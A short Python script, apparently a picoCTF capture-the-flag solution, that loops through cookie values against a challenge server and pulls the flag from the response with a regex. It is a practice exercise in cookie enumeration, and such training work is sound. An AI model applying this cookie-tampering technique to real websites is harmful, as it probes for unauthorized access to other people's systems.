#import library
import requests
import re

for i in range(20):
	#Set cookie value
	headers = {'Cookie': 'name=' + str(i)}
	#GET request
	r = requests.get('http://mercury.picoctf.net:64944/check', headers=headers)
	#Check flag in response text
	if 'picoCTF{' in r.text:
		#regex to find flag value
		p = re.compile('picoCTF\{.*\}')
		flag = p.findall(r.text)[0]
		print(flag)
